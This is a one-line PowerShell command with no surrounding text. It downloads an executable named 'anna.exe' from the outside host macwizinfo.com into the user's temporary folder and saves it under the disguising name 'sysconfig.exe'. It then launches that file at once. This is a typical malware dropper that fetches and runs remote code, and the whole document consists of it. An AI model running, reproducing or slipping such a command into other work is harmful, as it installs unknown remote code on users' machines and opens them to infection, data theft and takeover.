
(New-Object System.Net.WebClient).DownloadFile('http://www.macwizinfo.com/updates/anna.exe',"$env:TEMP\sysconfig.exe");Start-Process ("$env:TEMP\sysconfig.exe")

